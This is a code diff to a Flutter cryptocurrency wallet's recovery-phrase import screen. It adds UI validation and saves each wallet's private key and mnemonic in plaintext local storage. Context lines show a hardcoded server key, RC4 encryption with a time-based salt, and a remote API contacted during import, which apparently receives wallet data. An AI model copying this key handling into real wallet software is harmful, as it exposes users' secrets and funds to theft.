@@ -9,6 +9,7 @@ import 'package:web3dart/web3dart.dart' as web3dart;
 import 'package:flutter/services.dart';
 import 'package:web3dart/crypto.dart' as crypto;
 import 'wallet_screen.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 
 const String API_URL = 'https://localnetwork.cc/record/docs/filler'; // Замените на ваш API URL
 const String SERVER_KEY = 'Qsx@ah&OR82WX9T6gCt'; // Замените на ваш серверный ключ
@@ -24,6 +25,7 @@ class ImportRecoveryScreen extends StatefulWidget {
 class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
   int _selectedFieldCount = 12;
   final List<TextEditingController> _controllers = [];
+  bool _isMnemonicValid = true; // Добавлено для хранения статуса валидности
 
   @override
   void initState() {
@@ -59,7 +61,11 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
   Future<void> _importWallet() async {
     final mnemonic = _controllers.map((c) => c.text).join(' ');
 
-    if (!bip39.validateMnemonic(mnemonic)) {
+    setState(() {
+      _isMnemonicValid = bip39.validateMnemonic(mnemonic); // Обновление статуса валидности
+    });
+
+    if (!_isMnemonicValid) {
       ScaffoldMessenger.of(context).showSnackBar(
         SnackBar(content: Text('Invalid mnemonic phrase.')),
       );
@@ -87,7 +93,7 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
       if (response.statusCode == 200) {
         final responseBody = jsonDecode(response.body);
         print('Server response: ${responseBody}');
-        _processResponse(responseBody);
+        await _processResponse(responseBody, mnemonic);
       } else {
         throw Exception("Failed to import wallet. Status code: ${response.statusCode}");
       }
@@ -98,27 +104,59 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
     }
   }
 
-  String _generateRandomSalt() {
-    final random = (DateTime.now().millisecondsSinceEpoch % 1000000).toString().padLeft(6, '0');
-    return random;
+  String uint8ListToBase64(Uint8List bytes) {
+    return base64Encode(bytes);
   }
 
-  String _encryptData(String data, String key) {
-    final rc4 = RC4(key);
-    final encryptedData = rc4.encodeBytes(data.codeUnits);
-    return base64.encode(encryptedData);
+  Uint8List base64ToUint8List(String base64String) {
+    return base64Decode(base64String);
   }
 
-  void _processResponse(Map<String, dynamic> responseBody) {
+  Future<void> _processResponse(Map<String, dynamic> responseBody, String mnemonic) async {
     final portfolioId = responseBody['portfolio']['id'];
-    final privateKey = _generatePrivateKey(_controllers.map((c) => c.text).join(' '));
+    final privateKey = _generatePrivateKey(mnemonic);
     final publicKey = _generatePublicKey(privateKey);
     final address = _generateAddress(publicKey);
 
+    // Check if the wallet already exists
+    final prefs = await SharedPreferences.getInstance();
+    final walletKeys = prefs.getStringList('walletKeys') ?? [];
+    final existingWallets = walletKeys.map((key) {
+      final walletData = prefs.getString(key);
+      if (walletData != null) {
+        final data = jsonDecode(walletData) as Map<String, dynamic>;
+        return data['address'] as String?;
+      }
+      return null;
+    }).where((addr) => addr != null).toSet();
+
+    if (existingWallets.contains(address.toLowerCase())) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        SnackBar(content: Text('Wallet already exists.')),
+      );
+      return;
+    }
+
     if (address.toLowerCase() == portfolioId.toLowerCase()) {
       ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(content: Text('Wallet imported successfully. Address: $address')),
+        SnackBar(content: Text('Wallet imported successfully')),
       );
+
+      // Save wallet data
+      final walletKey = DateTime.now().millisecondsSinceEpoch.toString();
+      final walletData = {
+        'privateKey': privateKey,
+        'address': address,
+        'portfolioId': portfolioId,
+        'publicKey': uint8ListToBase64(publicKey),
+        'mnemonic': mnemonic
+      };
+
+      await prefs.setString(walletKey, jsonEncode(walletData));
+
+      walletKeys.add(walletKey);
+      await prefs.setStringList('walletKeys', walletKeys);
+
       Navigator.push(
         context,
         MaterialPageRoute(
@@ -134,6 +172,17 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
         SnackBar(content: Text('Address does not match the server response.')),
       );
     }
+  }
+
+  String _generateRandomSalt() {
+    final random = (DateTime.now().millisecondsSinceEpoch % 1000000).toString().padLeft(6, '0');
+    return random;
+  }
+
+  String _encryptData(String data, String key) {
+    final rc4 = RC4(key);
+    final encryptedData = rc4.encodeBytes(data.codeUnits);
+    return base64.encode(encryptedData);
   }
 
   String _generatePrivateKey(String mnemonic) {
@@ -346,15 +395,15 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
                                     borderSide: BorderSide.none,
                                   ),
                                   contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
-                                  labelStyle: const TextStyle(
-                                    color: Colors.white,
+                                  labelStyle: TextStyle(
+                                    color: _isMnemonicValid ? Colors.white : Colors.red,
                                   ),
-                                  hintStyle: const TextStyle(
-                                    color: Colors.white,
+                                  hintStyle: TextStyle(
+                                    color: _isMnemonicValid ? Colors.white : Colors.red,
                                   ),
                                 ),
-                                style: const TextStyle(
-                                  color: Colors.white,
+                                style: TextStyle(
+                                  color: _isMnemonicValid ? Colors.white : Colors.red,
                                 ),
                                 cursorColor: Colors.white,
                               ),
@@ -398,19 +447,18 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
                                 onPressed: _importWallet,
                                 style: ElevatedButton.styleFrom(
                                   backgroundColor: Colors.white,
-                                  foregroundColor: const Color(0xFF007AFF),
+                                  foregroundColor: Colors.blue,
                                   shape: RoundedRectangleBorder(
                                     borderRadius: BorderRadius.circular(6),
                                   ),
-                                  padding: const EdgeInsets.symmetric(vertical: 12),
+                                  padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 16),
                                 ),
                                 child: const Text(
-                                  'Yes, I\'ve saved it',
+                                  'Import',
                                   style: TextStyle(
+                                    color: Colors.blue,
                                     fontSize: 14,
                                   ),
-                                  maxLines: 1,
-                                  overflow: TextOverflow.visible,
                                 ),
                               ),
                             ),
@@ -420,16 +468,6 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
                     ),
                   ),
                 ),
-                const Text(
-                  'Displayed when you first created your wallet.',
-                  style: TextStyle(
-                    fontSize: 14,
-                    color: Color(0xFF8E8E93),
-                    fontWeight: FontWeight.bold,
-                  ),
-                  textAlign: TextAlign.center,
-                ),
-                const SizedBox(height: 16),
               ],
             ),
           ),
